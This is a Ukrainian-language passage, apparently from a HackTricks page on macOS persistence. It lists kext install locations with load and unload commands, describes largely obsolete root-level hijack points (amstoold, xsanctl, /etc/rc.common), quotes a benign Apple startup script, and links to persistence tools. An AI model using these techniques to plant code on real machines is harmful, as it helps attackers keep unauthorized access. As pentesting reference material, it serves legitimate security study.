XQuartz **більше не встановлюється в macOS**, тому, якщо вам потрібна додаткова інформація, перегляньте writeup.

### ~~kext~~

> [!CAUTION]
> Встановити kext настільки складно навіть із правами root, що я не розглядатиму це як спосіб втечі з sandbox або навіть для persistence (якщо у вас немає exploit)

#### Розташування

Щоб встановити KEXT як startup item, його потрібно **встановити в одному з наведених нижче розташувань**:

- `/System/Library/Extensions`
- Файли KEXT, вбудовані в операційну систему OS X.
- `/Library/Extensions`
- Файли KEXT, встановлені стороннім програмним забезпеченням

Поточний список завантажених файлів kext можна отримати за допомогою:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Щоб отримати додаткову інформацію про [**kernel extensions дивіться цей розділ**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Розташування

- **`/usr/local/bin/amstoold`**
- Потрібні права root

#### Опис і Exploitation

Схоже, що `plist` із `/System/Library/LaunchAgents/com.apple.amstoold.plist` використовував цей binary, водночас відкриваючи XPC service... Річ у тім, що binary не існував, тож туди можна було помістити щось власне, і коли викликався XPC service, викликався б ваш binary.

Я більше не можу знайти це у своїй macOS.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Розташування

- **`/Library/Preferences/Xsan/.xsanrc`**
- Потрібні права root
- **Тригер**: Коли запускається service (рідко)

#### Опис і exploit

Схоже, цей script запускається не дуже часто, і я навіть не зміг знайти його у своїй macOS, тому, якщо вам потрібна додаткова інформація, перегляньте writeup.

### ~~/etc/rc.common~~

> [!CAUTION] > **Це не працює в сучасних версіях MacOS**

Також сюди можна помістити **commands, які виконуватимуться під час запуску.** Приклад звичайного rc.common script:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Техніки та інструменти Persistence

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Посилання

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
